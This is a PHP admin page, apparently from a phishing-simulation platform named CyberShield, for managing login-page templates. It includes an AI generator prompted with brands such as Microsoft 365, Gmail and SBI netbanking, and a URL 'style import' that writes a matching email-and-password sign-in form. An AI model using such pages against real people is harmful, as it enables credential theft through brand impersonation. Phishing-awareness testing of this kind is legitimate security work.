<?php
session_start();
if (!isset($_SESSION['admin_id'])) { header("Location: login.php"); exit; }
require "db_connect.php";

$message = "";
$error   = "";
$edit_lp = null;

// ── Delete ─────────────────────────────────────────────────────────────────
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['delete_lp'])) {
    $lid = (int)$_POST['delete_id'];
    $d = $conn->prepare("DELETE FROM landing_page_templates WHERE lp_id=?");
    $d->bind_param("i", $lid); $d->execute(); $d->close();
    $message = "Landing page deleted.";
}

// ── Clone ──────────────────────────────────────────────────────────────────
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['clone_lp'])) {
    $lid = (int)$_POST['clone_id'];
    $orig = $conn->prepare("SELECT lp_name, page_title, body_html FROM landing_page_templates WHERE lp_id=?");
    $orig->bind_param("i", $lid); $orig->execute();
    $row = $orig->get_result()->fetch_assoc(); $orig->close();
    if ($row) {
        $new_name = "Copy of " . $row['lp_name'];
        $ins = $conn->prepare("INSERT INTO landing_page_templates (lp_name, page_title, body_html, is_ai_gen) VALUES (?, ?, ?, 0)");
        $ins->bind_param("sss", $new_name, $row['page_title'], $row['body_html']);
        $ins->execute(); $ins->close();
        $message = "Template cloned: \"$new_name\"";
    }
}

// ── AI Generate ────────────────────────────────────────────────────────────
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['generate_ai'])) {
    $prompt = $_POST['ai_prompt'] ?? 'Microsoft login page';
    $python = "/home/kali/cybershield-engine/venv/bin/python3";
    $script = "/home/kali/cybershield-engine/ai_generator.py";
    $output = shell_exec("$python $script --landing --prompt " . escapeshellarg($prompt) . " --json 2>&1");
    $decoded = json_decode($output, true);
    if ($decoded && isset($decoded['body_html'])) {
        $lp_name    = $decoded['lp_name'] ?? "AI - $prompt";
        $page_title = $decoded['page_title'] ?? $prompt;
        $body_html  = $decoded['body_html'];
        $ins = $conn->prepare("INSERT INTO landing_page_templates (lp_name, page_title, body_html, is_ai_gen) VALUES (?, ?, ?, 1)");
        $ins->bind_param("sss", $lp_name, $page_title, $body_html);
        $ins->execute(); $ins->close();
        $message = "AI landing page generated!";
    } else {
        $error = "AI generation failed. Mock mode active hai — manually create karo.";
    }
}

// ── Style Import ───────────────────────────────────────────────────────────
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['import_style'])) {
    $url     = $_POST['import_url'] ?? '';
    $lp_name = trim($_POST['import_name'] ?? 'Imported Page');
    if ($url && filter_var($url, FILTER_VALIDATE_URL)) {
        $html = @file_get_contents($url);
        if ($html) {
            preg_match_all('/color:\s*([#\w]+)/i', $html, $colors);
            preg_match_all('/background(?:-color)?:\s*([#\w]+)/i', $html, $bgs);
            $primary = $colors[1][0] ?? '#0078d4';
            $bg      = $bgs[1][0] ?? '#f5f5f5';
            $body_html = "<!DOCTYPE html><html><head><meta charset='UTF-8'>
<style>
body{font-family:Arial,sans-serif;background:$bg;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0}
.card{background:#fff;padding:40px;border-radius:8px;box-shadow:0 2px 20px rgba(0,0,0,0.1);width:100%;max-width:400px}
h1{color:$primary;margin-bottom:24px;font-size:24px}
input{width:100%;padding:10px 14px;border:1px solid #ddd;border-radius:4px;margin-bottom:16px;font-size:14px;box-sizing:border-box}
button{width:100%;padding:12px;background:$primary;color:#fff;border:none;border-radius:4px;font-size:15px;font-weight:bold;cursor:pointer}
</style></head>
<body><div class='card'><h1>Sign In</h1>
<form method='POST'>
<input type='email' name='email' placeholder='Email address' required>
<input type='password' name='password' placeholder='Password' required>
<button type='submit'>Sign In</button>
</form></div></body></html>";
            $ins = $conn->prepare("INSERT INTO landing_page_templates (lp_name, page_title, body_html, is_ai_gen) VALUES (?, ?, ?, 0)");
            $page_title = $lp_name;
            $ins->bind_param("sss", $lp_name, $page_title, $body_html);
            $ins->execute(); $ins->close();
            $message = "Style imported from: $url";
        } else {
            $error = "URL se content fetch nahi hua.";
        }
    } else {
        $error = "Valid URL daalo.";
    }
}

// ── Save New ───────────────────────────────────────────────────────────────
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['save_lp'])) {
    $lp_name    = trim($_POST['lp_name'] ?? '');
    $page_title = trim($_POST['page_title'] ?? '');
    $body_html  = $_POST['body_html'] ?? '';
    if (!$lp_name || !$body_html) {
        $error = "Name aur body required hain.";
    } else {
        $stmt = $conn->prepare("INSERT INTO landing_page_templates (lp_name, page_title, body_html, is_ai_gen) VALUES (?, ?, ?, 0)");
        $stmt->bind_param("sss", $lp_name, $page_title, $body_html);
        $stmt->execute(); $stmt->close();
        $message = "Landing page saved!";
    }
}

// ── Update ─────────────────────────────────────────────────────────────────
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['update_lp'])) {
    $lid        = (int)$_POST['lp_id'];
    $lp_name    = trim($_POST['lp_name'] ?? '');
    $page_title = trim($_POST['page_title'] ?? '');
    $body_html  = $_POST['body_html'] ?? '';
    if (!$lp_name || !$body_html) {
        $error = "Name aur body required hain.";
    } else {
        $stmt = $conn->prepare("UPDATE landing_page_templates SET lp_name=?, page_title=?, body_html=? WHERE lp_id=?");
        $stmt->bind_param("sssi", $lp_name, $page_title, $body_html, $lid);
        $stmt->execute(); $stmt->close();
        $message = "Landing page updated!";
    }
}

// ── Edit Load ──────────────────────────────────────────────────────────────
if (isset($_GET['edit'])) {
    $eid = (int)$_GET['edit'];
    $eq  = $conn->prepare("SELECT * FROM landing_page_templates WHERE lp_id=?");
    $eq->bind_param("i", $eid); $eq->execute();
    $edit_lp = $eq->get_result()->fetch_assoc(); $eq->close();
}

$pages = $conn->query("SELECT lp_id, lp_name, page_title, is_ai_gen, created_at FROM landing_page_templates ORDER BY created_at DESC");
$conn->close();
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>CyberShield - Landing Pages</title>
<script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gray-100 min-h-screen">
<nav class="bg-gray-900 text-white px-6 py-4 flex justify-between items-center">
    <div class="text-xl font-bold">🛡️ CyberShield</div>
    <a href="main_dashboard.php" class="text-sm text-gray-300 hover:text-white">← Dashboard</a>
</nav>

<div class="max-w-6xl mx-auto px-6 py-8">
    <h1 class="text-2xl font-bold text-gray-800 mb-6">🌐 Landing Pages</h1>

    <?php if ($message): ?>
    <div class="bg-green-100 border border-green-300 text-green-700 text-sm rounded px-4 py-3 mb-5">✅ <?php echo htmlspecialchars($message); ?></div>
    <?php endif; ?>
    <?php if ($error): ?>
    <div class="bg-red-100 border border-red-300 text-red-700 text-sm rounded px-4 py-3 mb-5">⚠️ <?php echo htmlspecialchars($error); ?></div>
    <?php endif; ?>

    <!-- AI GENERATE -->
    <div class="bg-purple-50 border border-purple-200 rounded-lg p-5 mb-5">
        <h2 class="text-sm font-semibold text-purple-800 mb-3">🤖 AI Landing Page Generator</h2>
        <form method="POST" class="flex gap-3">
            <input type="text" name="ai_prompt"
                   placeholder="e.g. Microsoft 365 login, Gmail signin, SBI netbanking"
                   class="flex-1 border rounded px-3 py-2 text-sm" required>
            <button type="submit" name="generate_ai" value="1"
                    class="bg-purple-600 text-white px-5 py-2 rounded font-semibold hover:bg-purple-700 text-sm">
                ✨ Generate
            </button>
        </form>
    </div>

    <!-- STYLE IMPORT -->
    <div class="bg-blue-50 border border-blue-200 rounded-lg p-5 mb-5">
        <h2 class="text-sm font-semibold text-blue-800 mb-3">🎨 Style Import from URL</h2>
        <form method="POST" class="flex gap-3">
            <input type="text" name="import_name"
                   placeholder="Page name e.g. HDFC Bank Login"
                   class="border rounded px-3 py-2 text-sm w-56" required>
            <input type="url" name="import_url"
                   placeholder="https://www.website.com"
                   class="flex-1 border rounded px-3 py-2 text-sm" required>
            <button type="submit" name="import_style" value="1"
                    class="bg-blue-600 text-white px-5 py-2 rounded font-semibold hover:bg-blue-700 text-sm">
                Import
            </button>
        </form>
    </div>

    <!-- CREATE / EDIT FORM -->
    <div class="bg-white shadow rounded-lg p-6 mb-8">
        <h2 class="text-lg font-semibold text-gray-800 mb-4">
            <?php echo $edit_lp ? "✏️ Edit Landing Page" : "➕ Create New Landing Page"; ?>
        </h2>
        <form method="POST" class="space-y-4">
            <?php if ($edit_lp): ?>
            <input type="hidden" name="lp_id" value="<?php echo $edit_lp['lp_id']; ?>">
            <?php endif; ?>

            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div>
                    <label class="block text-sm text-gray-600 mb-1">Page Name <span class="text-red-500">*</span></label>
                    <input type="text" name="lp_name" required
                           class="w-full border rounded px-3 py-2 text-sm"
                           placeholder="e.g. Microsoft 365 Login"
                           value="<?php echo htmlspecialchars($edit_lp['lp_name'] ?? ''); ?>">
                </div>
                <div>
                    <label class="block text-sm text-gray-600 mb-1">Page Title <span class="text-xs text-gray-400">(browser tab)</span></label>
                    <input type="text" name="page_title"
                           class="w-full border rounded px-3 py-2 text-sm"
                           placeholder="e.g. Sign in - Microsoft"
                           value="<?php echo htmlspecialchars($edit_lp['page_title'] ?? ''); ?>">
                </div>
            </div>

            <div>
                <label class="block text-sm text-gray-600 mb-1">HTML Body <span class="text-red-500">*</span></label>
                <textarea name="body_html" rows="14"
                          class="w-full border rounded px-3 py-2 font-mono text-xs resize-y"
                          placeholder="Full HTML page likho..."><?php echo htmlspecialchars($edit_lp['body_html'] ?? ''); ?></textarea>
            </div>

            <div class="flex gap-3">
                <button type="submit"
                        name="<?php echo $edit_lp ? 'update_lp' : 'save_lp'; ?>"
                        value="1"
                        class="bg-blue-600 text-white px-6 py-2 rounded font-semibold hover:bg-blue-700 text-sm">
                    <?php echo $edit_lp ? "Update Page" : "Save Page"; ?>
                </button>
                <?php if ($edit_lp): ?>
                <a href="landing_pages.php"
                   class="text-sm text-gray-500 hover:underline self-center">Cancel</a>
                <a href="landing_page_preview.php?id=<?php echo $edit_lp['lp_id']; ?>" target="_blank"
                   class="ml-auto bg-gray-800 text-white px-5 py-2 rounded font-semibold hover:bg-gray-900 text-sm">
                    👁️ Live Preview
                </a>
                <?php endif; ?>
            </div>
        </form>
    </div>

    <!-- PAGES LIST -->
    <div class="bg-white shadow rounded-lg overflow-hidden">
        <div class="px-6 py-4 border-b flex justify-between items-center">
            <h2 class="text-base font-semibold text-gray-800">All Landing Pages</h2>
            <span class="text-xs text-gray-400"><?php echo $pages->num_rows; ?> pages</span>
        </div>
        <table class="w-full text-sm text-left">
            <thead class="bg-gray-50 text-gray-500 text-xs">
                <tr>
                    <th class="px-4 py-3">ID</th>
                    <th class="px-4 py-3">Page Name</th>
                    <th class="px-4 py-3">Page Title</th>
                    <th class="px-4 py-3">Source</th>
                    <th class="px-4 py-3">Created</th>
                    <th class="px-4 py-3">Actions</th>
                </tr>
            </thead>
            <tbody class="divide-y">
                <?php while ($p = $pages->fetch_assoc()): ?>
                <tr class="hover:bg-gray-50">
                    <td class="px-4 py-3 text-gray-400">#<?php echo $p['lp_id']; ?></td>
                    <td class="px-4 py-3 font-medium"><?php echo htmlspecialchars($p['lp_name']); ?></td>
                    <td class="px-4 py-3 text-gray-500 text-xs"><?php echo htmlspecialchars($p['page_title'] ?? '—'); ?></td>
                    <td class="px-4 py-3">
                        <?php if ($p['is_ai_gen']): ?>
                        <span class="px-2 py-0.5 rounded text-xs bg-purple-100 text-purple-700">🤖 AI</span>
                        <?php else: ?>
                        <span class="px-2 py-0.5 rounded text-xs bg-gray-100 text-gray-600">Manual</span>
                        <?php endif; ?>
                    </td>
                    <td class="px-4 py-3 text-xs text-gray-400">
                        <?php echo $p['created_at'] ? date('d M Y', strtotime($p['created_at'])) : '—'; ?>
                    </td>
                    <td class="px-4 py-3">
                        <div class="flex gap-3">
                            <a href="landing_pages.php?edit=<?php echo $p['lp_id']; ?>"
                               class="text-blue-600 text-xs font-semibold hover:underline">✏️ Edit</a>
                            <a href="landing_page_preview.php?id=<?php echo $p['lp_id']; ?>" target="_blank"
                               class="text-gray-500 text-xs font-semibold hover:underline">👁️ Preview</a>
                            <form method="POST" class="inline" onsubmit="return confirm('Clone?')">
                                <input type="hidden" name="clone_id" value="<?php echo $p['lp_id']; ?>">
                                <button type="submit" name="clone_lp" value="1"
                                        class="text-green-600 text-xs font-semibold hover:underline">📋 Clone</button>
                            </form>
                            <form method="POST" class="inline" onsubmit="return confirm('Delete?')">
                                <input type="hidden" name="delete_id" value="<?php echo $p['lp_id']; ?>">
                                <button type="submit" name="delete_lp" value="1"
                                        class="text-red-500 text-xs font-semibold hover:underline">🗑️ Delete</button>
                            </form>
                        </div>
                    </td>
                </tr>
                <?php endwhile; ?>
            </tbody>
        </table>
    </div>
</div>
</body>
</html>
